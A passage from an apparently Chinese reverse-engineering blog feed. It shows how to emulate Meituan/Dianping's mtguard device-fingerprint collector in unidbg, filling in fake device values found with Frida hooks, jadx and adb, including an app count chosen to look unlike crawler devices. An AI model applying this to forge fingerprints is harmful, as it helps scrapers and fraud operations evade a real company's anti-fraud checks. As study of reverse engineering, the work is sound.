getSystemService(Context.WIFI_SERVICE);WifiInfo wifiInfo = wifiManager.getConnectionInfo();int rssi = wifiInfo.getRssi();Log.e(&quot;WiFi RSSI&quot;, String.valueOf(rssi));</code></pre><p>我的测试机获取到的值是 -47，补环境</p><pre><code class="language-Java">            case &quot;android/net/wifi/WifiInfo-&gt;getRssi()I&quot;: &#123;                return -47;            &#125;</code></pre><p>继续运行报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/telephony/TelephonyManager-&gt;getNetworkOperator()Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:376)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)</code></pre><p>这个 API 是获取当前移动网络运行商的 MCC + MNC。没插卡，直接返回空字符串。</p><pre><code class="language-Java">            case &quot;android/telephony/TelephonyManager-&gt;getNetworkOperator()Ljava/lang/String;&quot;: &#123;                return new StringObject(vm, &quot;&quot;);            &#125;</code></pre><p>继续运行，就跑通了</p><pre><code class="language-shell">[*] getLocationInfo: -|-|-|-|-|</code></pre><h3 id="十一、getPlatformInfo"><a href="#十一、getPlatformInfo" class="headerlink" title="十一、getPlatformInfo"></a>十一、getPlatformInfo</h3><p>发起调用</p><pre><code class="language-Java">public String getPlatformInfo()&#123;    String result = SIUACollector.callJniMethodObject(emulator, &quot;getPlatformInfo()Ljava/lang/String;&quot;).getValue().toString();    return result;&#125;</code></pre><p>运行，报错</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/text/SimpleDateFormat-&gt;allocObjectat com.github.unidbg.linux.android.dvm.AbstractJni.allocObject(AbstractJni.java:812)at com.test4.TEST4.allocObject(TEST4.java:139)at com.github.unidbg.linux.android.dvm.DvmClass.allocObject(DvmClass.java:74)at com.github.unidbg.linux.android.dvm.DalvikVM$24.handle(DalvikVM.java:365)</code></pre><p>同理处理</p><pre><code class="language-Java">case &quot;java/text/SimpleDateFormat-&gt;allocObject&quot;:&#123;    return dvmClass.newObject(signature);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/text/SimpleDateFormat-&gt;&lt;init&gt;(Ljava/lang/String;Ljava/util/Locale;)Vat com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:1007)at com.test4.TEST4.callVoidMethodV(TEST4.java:196)at com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:990)at com.github.unidbg.linux.android.dvm.DvmMethod.callVoidMethodA(DvmMethod.java:234)</code></pre><p>依旧处理为全局变量，然后补环境</p><pre><code class="language-Java">case &quot;java/text/SimpleDateFormat-&gt;&lt;init&gt;(Ljava/lang/String;Ljava/util/Locale;)V&quot;:&#123;    String pattern = vaList.getObjectArg(0).getValue().toString();    Locale locale = (Locale) vaList.getObjectArg(1).getValue();    simpleDateFormat = new SimpleDateFormat(pattern, locale);    return;&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/os/Build$VERSION-&gt;SDK:Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:103)at com.test4.TEST4.getStaticObjectField(TEST4.java:567)at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:53)at com.github.unidbg.linux.android.dvm.DvmField.getStaticObjectField(DvmField.java:106)at com.github.unidbg.linux.android.dvm.DalvikVM$142.handle(DalvikVM.java:2275)</code></pre><p>前面我们补过 <strong>android&#x2F;os&#x2F;Build$VERSION-&gt;SDK_INT:I</strong>，它和此处作用一致，区别仅在于返回数字还是字符串。</p><pre><code class="language-Java">case &quot;android/os/Build$VERSION-&gt;SDK:Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;35&quot;);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/util/Date-&gt;allocObjectat com.github.unidbg.linux.android.dvm.AbstractJni.allocObject(AbstractJni.java:812)at com.test4.TEST4.allocObject(TEST4.java:144)at com.github.unidbg.linux.android.dvm.DvmClass.allocObject(DvmClass.java:74)</code></pre><p>补环境</p><pre><code class="language-Java">case &quot;java/util/Date-&gt;allocObject&quot;:&#123;    return dvmClass.newObject(signature);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/util/Date-&gt;&lt;init&gt;()Vat com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:1007)at com.test4.TEST4.callVoidMethodV(TEST4.java:207)at com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:990)</code></pre><p>这是一个无参构造，那可以回头修改 allocObject 那里的代码，是得思路更清晰</p><pre><code class="language-Java">case &quot;java/util/Date-&gt;allocObject&quot;:&#123;    return ProxyDvmObject.createObject(vm, new Date());&#125;</code></pre><p>然后下面初始化的时候就不用做什么了</p><pre><code class="language-Java">case &quot;java/util/Date-&gt;&lt;init&gt;()V&quot;:&#123;    return;&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: java/text/SimpleDateFormat-&gt;format(Ljava/util/Date;)Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:403)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)</code></pre><p>补环境，直接返回一个固定的已格式化的时间字符串</p><pre><code class="language-Java">            case &quot;java/text/SimpleDateFormat-&gt;format(Ljava/util/Date;)Ljava/lang/String;&quot;: &#123;                return new StringObject(vm, &quot;2025-08-04 09:05:05&quot;);            &#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;androidAppCnt(Landroid/content/Context;)Iat com.github.unidbg.linux.android.dvm.AbstractJni.callIntMethodV(AbstractJni.java:563)at com.test4.TEST4.callIntMethodV(TEST4.java:510)at com.github.unidbg.linux.android.dvm.AbstractJni.callIntMethodV(AbstractJni.java:529)at com.github.unidbg.linux.android.dvm.DvmMethod.callIntMethodA(DvmMethod.java:134)</code></pre><p><strong>jadx</strong> 中看 androidAppCnt 的实现</p><pre><code class="language-Java">public static int androidAppCnt(Context context) &#123;    int i;    Object[] objArr = &#123;context&#125;;    ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;    if (PatchProxy.isSupport(objArr, null, changeQuickRedirect2, true, &quot;e2af58080aad5d311267bb7c71e6cce2&quot;, RobustBitConfig.DEFAULT_VALUE)) &#123;        return ((Integer) PatchProxy.accessDispatch(objArr, null, changeQuickRedirect2, true, &quot;e2af58080aad5d311267bb7c71e6cce2&quot;)).intValue();    &#125;    int i2 = androidAppCntCache;    if (i2 != 0) &#123;        return i2;    &#125;    if (context == null) &#123;        return 0;    &#125;    if (Thread.currentThread() == Looper.getMainLooper().getThread()) &#123;        return androidAppCntCache;    &#125;    try &#123;        lock.lock();    &#125; catch (Throwable th) &#123;        c.a(th);    &#125;    if (androidAppCntCache != 0) &#123;        i = androidAppCntCache;    &#125; else &#123;        PackageManager pkgManager = getPkgManager(context);        if (pkgManager == null) &#123;            i = androidAppCntCache;        &#125; else &#123;            androidAppCntCache = pkgManager.getInstalledApplications(128).size();            lock.unlock();            return androidAppCntCache;        &#125;    &#125;    lock.unlock();    return i;&#125;</code></pre><p>代码逻辑是在获取设备安装了多少 App，相比较正常的用户设备，爬虫、黑灰产专用设备往往只安装很少的一些 App。读者可以随机返回一个大于 200 的数字，如果想确定测试机上的应用数，可以 Hook <strong>androidAppCnt</strong> 函数或者使用 ADB。</p><pre><code class="language-shell">└─Δ adb shellares:/ $ pm list packagepackage:com.miui.screenrecorderpackage:com.mediatek.imspackage:com.mediatek.op01.phone.pluginpackage:icu.nullptr.applistdetectorpackage:com.android.cts.priv.ctsshim...</code></pre><p>补环境</p><pre><code class="language-Java">case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;androidAppCnt(Landroid/content/Context;)I&quot;:&#123;    return 408;&#125;</code></pre><p>新错误</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;appCache(Landroid/content/Context;)Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:406)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)</code></pre><p>具体代码逻辑是计算 App 缓存目录大小，直接 Hook 获取</p><pre><code class="language-js">function callSIUACollector() &#123;  setTimeout(function () &#123;    Java.perform(function () &#123;      const ActivityThread = Java.use(&quot;android.app.ActivityThread&quot;);      let context = ActivityThread.currentApplication().getApplicationContext();      const ContextClass = Java.use(&quot;android.content.Context&quot;);      const ctx = Java.cast(context, ContextClass);      let SIUACollector = Java.use(        &quot;com.meituan.android.common.mtguard.NBridge$SIUACollector&quot;      );      // 传context创建实例      let instance = SIUACollector.$new(ctx);      let result = instance.appCache(ctx);      console.log(&quot;ret: &quot; + result);    &#125;);  &#125;, 3000);&#125;callSIUACollector();</code></pre><p>我的测试机拿到的数据是 114324295。补环境</p><pre><code class="language-Java">case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;appCache(Landroid/content/Context;)Ljava/lang/String;&quot;:    return new StringObject(vm, &quot;114324295&quot;);</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;availableSystem()Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:409)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)</code></pre><p>看伪代码</p><pre><code class="language-java">public static String availableSystem() &#123;    Object[] objArr = new Object[0];    ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;    if (PatchProxy.isSupport(objArr, null, changeQuickRedirect2, true, &quot;234b4d16d3aab7d4062d61d2146219de&quot;, RobustBitConfig.DEFAULT_VALUE)) &#123;        return (String) PatchProxy.accessDispatch(objArr, null, changeQuickRedirect2, true, &quot;234b4d16d3aab7d4062d61d2146219de&quot;);    &#125;    try &#123;        File dataDirectory = Environment.getDataDirectory();        if (!readable(dataDirectory)) &#123;            return &quot;unknown&quot;;        &#125;        StatFs statFs = new StatFs(dataDirectory.getPath());        return StringUtils.toString(statFs.getAvailableBlocks() * statFs.getBlockSize());    &#125; catch (Throwable th) &#123;        c.a(th);        return &quot;unknown&quot;;    &#125;&#125;</code></pre><p>用 frida hook 测试一下</p><pre><code class="language-js">Java.perform(function() &#123;  let DeviceInfoWorker = Java.use(&quot;com.meituan.android.common.dfingerprint.collection.workers.DeviceInfoWorker&quot;);  DeviceInfoWorker[&quot;availableSystem&quot;].implementation = function () &#123;    console.log(&#39;availableSystem is called&#39;);    let ret = this.availableSystem();    console.log(&#39;availableSystem ret value is &#39; + ret);    return ret;  &#125;;&#125;)</code></pre><p>hook 结果</p><pre><code class="language-shell">availableSystem is calledavailableSystem ret value is unknown</code></pre><p>补环境</p><pre><code class="language-Java">case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;availableSystem()Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;unknown&quot;);&#125;</code></pre><p>继续运行，还是在获取设备存储相关信息</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;totalMemory()Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:412)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)</code></pre><p><strong>Jadx</strong> 中查看具体代码逻辑</p><pre><code class="language-Java">public static String totalMemory() &#123;    Object[] objArr = new Object[0];    ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;    if (PatchProxy.isSupport(objArr, null, changeQuickRedirect2, true, &quot;a240e07aebe4d91708d281e29b9fc189&quot;, RobustBitConfig.DEFAULT_VALUE)) &#123;        return (String) PatchProxy.accessDispatch(objArr, null, changeQuickRedirect2, true, &quot;a240e07aebe4d91708d281e29b9fc189&quot;);    &#125;    try &#123;        FileReader fileReader = new FileReader(&quot;/proc/meminfo&quot;);        BufferedReader bufferedReader = new BufferedReader(fileReader);        bufferedReader.close();        fileReader.close();        return StringUtils.toString(Long.valueOf(bufferedReader.readLine().split(&quot;\\s+&quot;)[1]).intValue() * 1024);    &#125; catch (Throwable th) &#123;        c.a(th);        return &quot;unknown&quot;;    &#125;&#125;</code></pre><p>这里是在访问 &#x2F;proc&#x2F;meminfo 的首行，我们也可以在 adb 中复现这一过程</p><pre><code class="language-shell">└─Δ adb shellares:/ $ cat /proc/meminfoMemTotal:        7714228 kBMemFree:          187216 kBMemAvailable:    3950016 kBBuffers:            7428 kBCached:          4022680 kBSwapCached:       139544 kB</code></pre><p>进行一下单位转换，7714228 * 1024 &#x3D; 7,899,369,472 B<br>然后也可以 frida hook 验证一下</p><pre><code class="language-js">function callSIUACollector() &#123;  setTimeout(function () &#123;    Java.perform(function () &#123;      const ActivityThread = Java.use(&quot;android.app.ActivityThread&quot;);      let context = ActivityThread.currentApplication().getApplicationContext();      const ContextClass = Java.use(&quot;android.content.Context&quot;);      const ctx = Java.cast(context, ContextClass);      let SIUACollector = Java.use(        &quot;com.meituan.android.common.mtguard.NBridge$SIUACollector&quot;      );      // 传context创建实例      let instance = SIUACollector.$new(ctx);      let result = instance.totalMemory();      console.log(&quot;ret: &quot; + result);    &#125;);  &#125;, 3000);&#125;callSIUACollector();</code></pre><p>得到的结果</p><pre><code class="language-shell">ret: 7899369472</code></pre><p>符合预期。补环境</p><pre><code class="language-Java">case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;totalMemory()Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;7899369472&quot;);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getFirstLaunchTime(Landroid/content/Context;)Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:415)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodA(DvmMethod.java:94)</code></pre><p>getFirstLaunchTime 语义清晰，即 App 安装后的首次启动时间。直接 Hook 查看</p><pre><code class="language-js">function callSIUACollector() &#123;  setTimeout(function () &#123;    Java.perform(function () &#123;      const ActivityThread = Java.use(&quot;android.app.ActivityThread&quot;);      let context = ActivityThread.currentApplication().getApplicationContext();      const ContextClass = Java.use(&quot;android.content.Context&quot;);      const ctx = Java.cast(context, ContextClass);      let SIUACollector = Java.use(        &quot;com.meituan.android.common.mtguard.NBridge$SIUACollector&quot;      );      // 传context创建实例      let instance = SIUACollector.$new(ctx);      let result = instance.getFirstLaunchTime(ctx);      console.log(&quot;ret: &quot; + result);    &#125;);  &#125;, 3000);&#125;callSIUACollector();</code></pre><p>hook 结果</p><pre><code class="language-shell">ret: 1755054762052</code></pre><p>这是时间戳，转一下，不过得注意单位是毫秒<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250814115612408.png" alt="image-20250814115612408"></p><p>补环境</p><pre><code class="language-Java">case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getFirstLaunchTime(Landroid/content/Context;)Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, &quot;1755054762052&quot;);&#125;</code></pre><p>运行得到结果</p><pre><code class="language-shell">[*] getPlatformInfo: Android|com.dianping.v1|10.41.15|35|-|2025-08-04 09:05:05|408|114324295|-|7899369472|1755054762052|-|-|</code></pre><h3 id="十二、getUserAction"><a href="#十二、getUserAction" class="headerlink" title="十二、getUserAction"></a>十二、getUserAction</h3><p>发起调用</p><pre><code class="language-Java">public String getUserAction()&#123;    String result = SIUACollector.callJniMethodObject(emulator, &quot;getUserAction()Ljava/lang/String;&quot;).getValue().toString();    return result;&#125;</code></pre><p>开始补环境</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;batteryHelper:Lcom/meituan/android/common/dfingerprint/collection/utils/BatteryHelper;at com.github.unidbg.linux.android.dvm.AbstractJni.getObjectField(AbstractJni.java:171)at com.test4.TEST4.getObjectField(TEST4.java:437)at com.github.unidbg.linux.android.dvm.AbstractJni.getObjectField(AbstractJni.java:141)</code></pre><p>从名字可以看出，是和电池有关的处理</p><pre><code>case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;batteryHelper:Lcom/meituan/android/common/dfingerprint/collection/utils/BatteryHelper;&quot;:&#123;    return vm.resolveClass(&quot;com/meituan/android/common/dfingerprint/collection/utils/BatteryHelper&quot;).newObject(null);&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getBatteryInfo()Zat com.github.unidbg.linux.android.dvm.AbstractJni.callBooleanMethodV(AbstractJni.java:625)at com.test4.TEST4.callBooleanMethodV(TEST4.java:486)at com.github.unidbg.linux.android.dvm.AbstractJni.callBooleanMethodV(AbstractJni.java:603)</code></pre><p>看起来是在确认是否可以获取电池相关的信息</p><pre><code class="language-Java">private boolean getBatteryInfo() &#123;    Object[] objArr = new Object[0];    ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;    if (PatchProxy.isSupport(objArr, this, changeQuickRedirect2, false, &quot;2d10aac5384d6818e2765f99df76bffe&quot;, RobustBitConfig.DEFAULT_VALUE)) &#123;        return ((Boolean) PatchProxy.accessDispatch(objArr, this, changeQuickRedirect2, false, &quot;2d10aac5384d6818e2765f99df76bffe&quot;)).booleanValue();    &#125;    Context context = this.mContext;    if (context == null) &#123;        return false;    &#125;    BatteryStatus batteryStatus = BatteryHelper.getInstance(context).getBatteryStatus();    this.level = batteryStatus.batteryLevel;    this.scale = batteryStatus.batteryScale;    int i = batteryStatus.batteryStatus;    int i2 = batteryStatus.batteryPlugged;    if (i == 2 &amp;&amp; i2 == 2) &#123;        this.status = 1;    &#125; else &#123;        this.status = 0;    &#125;    if (i2 == 2) &#123;        this.plugged = true;    &#125; else &#123;        this.plugged = false;    &#125;    return true;&#125;</code></pre><p>补环境</p><pre><code class="language-Java">case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getBatteryInfo()Z&quot;:&#123;    return true;&#125;</code></pre><p>继续运行</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;level:Iat com.github.unidbg.linux.android.dvm.AbstractJni.getIntField(AbstractJni.java:648)at com.github.unidbg.linux.android.dvm.AbstractJni.getIntField(AbstractJni.java:640)</code></pre><p><strong>this.level</strong> 在上面的 getBatteryInfo 方法里进行了赋值，如果追根溯源，逻辑则来自于下面这段代码</p><pre><code class="language-Java">private void recordStatus(Intent intent) &#123;    Object[] objArr = &#123;intent&#125;;    ChangeQuickRedirect changeQuickRedirect2 = changeQuickRedirect;    if (PatchProxy.isSupport(objArr, this, changeQuickRedirect2, false, &quot;ca80b285aa559be35b7dd31c0b707222&quot;, RobustBitConfig.DEFAULT_VALUE)) &#123;        PatchProxy.accessDispatch(objArr, this, changeQuickRedirect2, false, &quot;ca80b285aa559be35b7dd31c0b707222&quot;);    &#125; else if (intent == null) &#123;    &#125; else &#123;        try &#123;            int intExtra = intent.getIntExtra(&quot;level&quot;, 0);            int intExtra2 = intent.getIntExtra(&quot;scale&quot;, 100);            int intExtra3 = intent.getIntExtra(&quot;status&quot;, -1);            int intExtra4 = intent.getIntExtra(&quot;plugged&quot;, 0);            this.mBatteryStatus.batteryTemperature = intent.getIntExtra(&quot;temperature&quot;, 0) / 10.0f;            this.mBatteryStatus.batteryLevel = intExtra;            this.mBatteryStatus.batteryScale = intExtra2;            this.mBatteryStatus.batteryStatus = intExtra3;            this.mBatteryStatus.batteryPlugged = intExtra4;        &#125; catch (Exception e) &#123;            c.a(e);            DFPLog.error(e);        &#125;    &#125;&#125;</code></pre><p>level 就是当前电量，scale 是总电量，它并不一定是 100.status 表示是否处于充电状态，plugged 则表示充电模式，Android 有两种充电模式，1 是充电器充电，也叫 AC 充电。2 是 USB 充电，比如插在电脑上充电。</p><p>样本接下来会依次获取这四个字段，读者可以 Hook SIUACollector 实例，获取这些字段。查看实例中某些字段的值，这个场景用 <a href="https://github.com/r0ysue/r0tracer/blob/main/r0tracer.js">r0tracer</a> 会很舒服。</p><pre><code class="language-java">//A. 简易trace单个函数traceClass(&quot;com.meituan.android.common.mtguard.NBridge$SIUACollector&quot;)</code></pre><p>在输出日志中可以找到下面这些</p><pre><code class="language-shell">int     level =&gt; 100 =&gt; 100boolean         plugged =&gt; false =&gt; falseint     scale =&gt; 100 =&gt; 100int     status =&gt; 0 =&gt; 0</code></pre><p>根据结果补环境</p><pre><code class="language-Java">public int getIntField(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature) &#123;        switch (signature) &#123;            case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;level:I&quot;: &#123;                return 100;            &#125;            case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;scale:I&quot;: &#123;                return 100;            &#125;            case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;status:I&quot;: &#123;                return 0;            &#125;        &#125;        return  super.getIntField(vm, dvmObject, signature);    &#125;</code></pre><p>继续</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;plugged:Zat com.github.unidbg.linux.android.dvm.AbstractJni.getBooleanField(AbstractJni.java:717)</code></pre><p>补环境</p><pre><code class="language-Java">@Overridepublic boolean getBooleanField(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature) &#123;    switch (signature)&#123;        case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;plugged:Z&quot;:&#123;            return false;        &#125;    &#125;    return super.getBooleanField(vm, dvmObject, signature);&#125;</code></pre><p>电池相关的大概告一段落了</p><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getDataActivity(Landroid/content/Context;)Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417)at com.test4.TEST4.callObjectMethodV(TEST4.java:424)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262)</code></pre><p>刚才的 r0tracer 还有用，日志中搜索 getDataActivity。</p><pre><code class="language-shell">retval: 0 =&gt; &quot;0&quot;*** exiting com.meituan.android.common.mtguard.NBridge$SIUACollector.getDataActivity</code></pre><p>补环境</p><pre><code class="language-Java">case &quot;com/meituan/android/common/mtguard/NBridge$SIUACollector-&gt;getDataActivity(Landroid/content/Context;)Ljava/lang/String;&quot;:    return new StringObject(vm, &quot;0&quot;);</code></pre><p>得出结果</p><pre><code class="language-shell">[*] getUserAction: -|100|1|0|0|-|92cbbca8-4858-40cd-b96c-4c52cd6eb17b|0|</code></pre><h3 id="十三、尾声"><a href="#十三、尾声" class="headerlink" title="十三、尾声"></a>十三、尾声</h3><p>写过最长最枯燥的一次，写了三天…</p><h3 id="十四、参考"><a href="#十四、参考" class="headerlink" title="十四、参考"></a>十四、参考</h3><p><a href="https://www.yuque.com/lilac-2hqvv/xdwlsg/avlc01hrko6yvr26#L4RNF">Unidbg 的基本使用（六）</a></p>]]></content>
      
      
      <categories>
          
          <category> Unidbg学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unidbg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从实践中学习unidbg使用(五)</title>
      <link href="/2025/08/08/%E4%BB%8E%E5%AE%9E%E8%B7%B5%E4%B8%AD%E5%AD%A6%E4%B9%A0unidbg%E4%BD%BF%E7%94%A8(%E4%BA%94)/"/>
      <url>/2025/08/08/%E4%BB%8E%E5%AE%9E%E8%B7%B5%E4%B8%AD%E5%AD%A6%E4%B9%A0unidbg%E4%BD%BF%E7%94%A8(%E4%BA%94)/</url>
      
        <content type="html"><![CDATA[<h1 id="从实践中学习unidbg使用-五"><a href="#从实践中学习unidbg使用-五" class="headerlink" title="从实践中学习unidbg使用(五)"></a>从实践中学习unidbg使用(五)</h1><h3 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h3><p>本篇讨论 Unidbg 中补 JNI 环境的 “形式”。</p><h3 id="二、概述"><a href="#二、概述" class="headerlink" title="二、概述"></a>二、概述</h3><p>在前文中给出了如下规则，但它看起来很干瘪，本篇就是要让它们更 “饱满”。</p><ul><li>基本类型直接传递；</li><li>字符串、字节数组等基本对象直接传递，其内部会做封装，也可以自己调用 <strong>new StringObject(vm, str)</strong>、**new ByteArray(vm, value)**等；</li><li>JDK 标准对象，如 HashMap、JSONObject 等，使用 <strong>ProxyDvmObject.createObject(vm, value)</strong> 处理；</li><li>非 JDK 标准库对象，如 Android Context、SharedPreference 等，使用 <strong>vm.resolveClass(vm, className).newObject(value)</strong> 处理。</li></ul><p>可以看到，主要基于数据类型做不同的处理。</p><p>如果要发起对目标函数的调用，那么查看代码的反编译情况，可以看到清晰的参数类型</p><pre><code class="language-Java">static native SignedQuery s(SortedMap&lt;String, String&gt; sortedMap);</code></pre><p>如果样本通过 JNI 访问 Java 方法，那么根据报错确定返回值类型。</p><ul><li>例一</li></ul><pre><code class="language-shell">java.lang.UnsupportedOperationException: com/izuiyou/common/base/BaseApplication-&gt;getAppContext()Landroid/content/Context;at com.github.unidbg.linux.android.dvm.AbstractJni.callStaticObjectMethodV(AbstractJni.java:503)at com.github.unidbg.linux.android.dvm.AbstractJni.callStaticObjectMethodV(AbstractJni.java:437)at com.github.unidbg.linux.android.dvm.DvmMethod.callStaticObjectMethodV(DvmMethod.java:64)</code></pre><p>方法签名中，返回值是 <strong>Landroid&#x2F;content&#x2F;Context;</strong></p><table><thead><tr><th>Java类型</th><th>签名</th></tr></thead><tbody><tr><td>boolean</td><td>z</td></tr><tr><td>byte</td><td>B</td></tr><tr><td>char</td><td>C</td></tr><tr><td>short</td><td>S</td></tr><tr><td>int</td><td>I</td></tr><tr><td>long</td><td>J</td></tr><tr><td>float</td><td>F</td></tr><tr><td>double</td><td>D</td></tr><tr><td>void</td><td>V</td></tr><tr><td>class</td><td>Lclass;</td></tr><tr><td>[ type</td><td>type[]</td></tr></tbody></table><p>根据对应关系，其类型就是 <strong>android&#x2F;content&#x2F;Context</strong> 。</p><ul><li>例二</li></ul><pre><code class="language-shell">java.lang.UnsupportedOperationException: cn/xiaochuankeji/tieba/AppController-&gt;getPackageManager()Landroid/content/pm/PackageManager;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:416)at com.izuiyou.NetWork.callObjectMethodV(NetWork.java:79)</code></pre><p>同理，类型是 <strong>android&#x2F;content&#x2F;pm&#x2F;PackageManager</strong> 。</p><ul><li>例三</li></ul><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/os/Process-&gt;myPid()Iat com.github.unidbg.linux.android.dvm.AbstractJni.callStaticIntMethodV(AbstractJni.java:211)</code></pre><p><strong>I</strong> 即 int，对于基本类型，也可以根据使用的 JNI 方法做判断，比如这里是 <strong>callStaticIntMethodV</strong>，其中的 <strong>Int</strong>。</p><ul><li>例四</li></ul><pre><code class="language-shell">java.lang.UnsupportedOperationException: android/os/Debug-&gt;isDebuggerConnected()Zat com.github.unidbg.linux.android.dvm.AbstractJni.callStaticBooleanMethodV(AbstractJni.java:191)</code></pre><p>Z 即 boolean，或者根据 callStaticBooleanMethodV 里的 Boolean 确认。</p><h3 id="三、类型一"><a href="#三、类型一" class="headerlink" title="三、类型一"></a>三、类型一</h3><p>首先看基本类型，即所谓的 byte、short、int、long、double、float、boolean、char，只需要直接传递即可。以 AbstractJNI 为例，可以找到很多的例子，比如下面直接返回 0x40，至于值是如何来的，这不是本篇的重点，本篇只讨论补环境的 ”形式“ ，补环境的 ”内容” 则是后文的重点。</p><pre><code class="language-Java">@Overridepublic int getStaticIntField(BaseVM vm, DvmClass dvmClass, String signature) &#123;    if (&quot;android/content/pm/PackageManager-&gt;GET_SIGNATURES:I&quot;.equals(signature)) &#123;        return 0x40;    &#125;    throw new UnsupportedOperationException(signature);&#125;</code></pre><p>需要注意的是，在准备参数，发起函数调用时，<strong>Long</strong> 类型的参数必须是显示声明，即在整数后面加 <strong>L</strong> ，以供 Unidbg 识别和处理，而不能搞隐式转换那套。</p><h3 id="四、类型二"><a href="#四、类型二" class="headerlink" title="四、类型二"></a>四、类型二</h3><p>接下来看基本对象——基本类型的包装类、字符串、基本类型数组、对象类型数组等等。</p><ul><li>例一</li></ul><pre><code class="language-shell">java.lang.UnsupportedOperationException: cn/xiaochuankeji/tieba/AppController-&gt;getPackageName()Ljava/lang/String;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:416)at com.izuiyou.NetWork.callObjectMethodV(NetWork.java:86)at 